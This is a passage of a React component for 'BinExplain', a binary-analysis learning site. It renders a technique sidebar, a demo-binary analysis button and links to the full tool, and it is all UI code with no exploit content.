          </div>
        )}
      </div>

      {/* Demo binary analysis */}
      <div style={{
        background: 'rgba(56,139,253,0.06)', border: '1px solid rgba(56,139,253,0.3)',
        borderRadius: '10px', padding: '20px', marginBottom: '28px'
      }}>
        <div style={{ fontSize: '13px', fontWeight: 700, color: '#79c0ff', marginBottom: '14px' }}>
          🎯 Demo Binary — try BinExplain on a real challenge binary
        </div>

        <button
          onClick={handleAnalyzeDemo}
          disabled={demoLoading}
          style={{
            width: '100%', padding: '11px', borderRadius: '6px',
            fontSize: '13px', fontWeight: 600, cursor: demoLoading ? 'not-allowed' : 'pointer',
            background: demoLoading ? '#21262d' : '#238636',
            border: '1px solid #2ea043', color: 'white',
            opacity: demoLoading ? 0.6 : 1, transition: 'background 0.15s',
            marginBottom: demoResult || demoError ? '16px' : 0
          }}
        >
          {demoLoading ? '⟳ Loading analysis...' : `▶ Analyze ${cat.demoName} — see BinExplain in action`}
        </button>
        {demoError && <div style={{ color: '#ff7b72', fontSize: '12px', marginTop: '8px' }}>{demoError}</div>}
        {demoResult && <DemoResultPanel result={demoResult} />}
      </div>

      {/* CTA */}
      <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
        <a href="/"
          style={{
            flex: '2 1 200px', padding: '11px 20px', borderRadius: '8px',
            background: cat.color, color: '#000',
            fontSize: '13px', fontWeight: 700, textDecoration: 'none',
            textAlign: 'center', display: 'inline-block'
          }}
        >
          Try your own binary on BinExplain →
        </a>
        <button
          onClick={() => { if (onSectionChange) onSectionChange('flowchart'); }}
          style={{
            flex: '1 1 160px', padding: '11px 16px', borderRadius: '8px',
            background: 'transparent', color: '#8b949e',
            border: '1px solid #30363d', fontSize: '13px', fontWeight: 600, cursor: 'pointer'
          }}
        >
          ← Use Flowchart Classifier
        </button>
      </div>
    </div>
  );
}

/* ──────────────────────────────────────────────────────────────────── */
/*  Main component — sidebar + content                                  */
/* ──────────────────────────────────────────────────────────────────── */
export default function TryItYourself({ onSectionChange }) {
  const [selected, setSelected] = useState('ret2win');
  const activeCat = CATEGORIES.find(c => c.id === selected);

  return (
    <div>
      {/* Header */}
      <div style={{ textAlign: 'center', marginBottom: '32px' }}>
        <h2 style={{ color: 'var(--text-primary)', fontSize: '22px', fontWeight: 700, margin: '0 0 8px' }}>
          Practice Challenges &amp; Targets
        </h2>
        <p style={{ color: 'var(--text-secondary)', fontSize: '14px', margin: 0, lineHeight: '1.5' }}>
          Select a technique to read its full guide, attack walkthrough, exploit template, and run the demo binary.
        </p>
      </div>

      {/* Sidebar + Content layout */}
      <div style={{
        display: 'flex',
        gap: '32px',
        alignItems: 'flex-start',
      }}>
        {/* LEFT SIDEBAR */}
        <div style={{
          width: '220px',
          flexShrink: 0,
          position: 'sticky',
          top: '80px',
          height: 'fit-content',
          borderRight: '1px solid #21262d',
          paddingRight: '24px',
        }}>
          <div style={{
            fontSize: '10px', fontWeight: 800, color: '#6e7681',
            textTransform: 'uppercase', letterSpacing: '0.12em',
            marginBottom: '14px'
          }}>
            Techniques
          </div>
          <nav style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
            {CATEGORIES.map(cat => {
              const isActive = selected === cat.id;
              return (
                <button
                  key={cat.id}
                  onClick={() => setSelected(cat.id)}
                  style={{
                    width: '100%',
                    display: 'flex', alignItems: 'center', gap: '8px',
                    padding: '9px 12px', borderRadius: '6px',
                    background: isActive ? `${cat.dim}` : 'transparent',
                    border: isActive ? `1px solid ${cat.border}` : '1px solid transparent',
                    color: isActive ? cat.color : '#8b949e',
                    fontSize: '13px', fontWeight: isActive ? 700 : 500,
                    cursor: 'pointer', textAlign: 'left',
                    transition: 'all 0.15s',
                  }}
                  onMouseEnter={e => { if (!isActive) { e.currentTarget.style.color = '#c9d1d9'; e.currentTarget.style.background = '#21262d'; } }}
                  onMouseLeave={e => { if (!isActive) { e.currentTarget.style.color = '#8b949e'; e.currentTarget.style.background = 'transparent'; } }}
                >
                  <span style={{ fontSize: '16px', flexShrink: 0 }}>{cat.emoji}</span>
                  <div style={{ minWidth: 0 }}>
                    <div style={{ fontFamily: 'monospace', fontSize: '12px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cat.title}</div>
                    <div style={{
                      fontSize: '9px', fontWeight: 700, marginTop: '2px', textTransform: 'uppercase',
                      color: cat.difficultyColor.text, opacity: isActive ? 1 : 0.7
                    }}>{cat.difficulty}</div>
                  </div>
                </button>
              );
            })}
          </nav>

          {/* Mini CTA at bottom of sidebar */}
          <div style={{ marginTop: '24px', paddingTop: '16px', borderTop: '1px solid #21262d' }}>
            <a href="/"
              style={{
                display: 'block', padding: '9px 12px', borderRadius: '6px',
                background: '#238636', color: '#fff',
                fontSize: '11px', fontWeight: 700, textDecoration: 'none',
                textAlign: 'center', border: '1px solid #2ea043'
              }}
            >
              Use Full Tool →
            </a>
          </div>
        </div>

        {/* RIGHT CONTENT */}
        <div style={{ flex: 1, minWidth: 0 }}>
          {activeCat && <CategoryDetail key={activeCat.id} cat={activeCat} onSectionChange={onSectionChange} />}
        </div>
      </div>
    </div>
  );
}
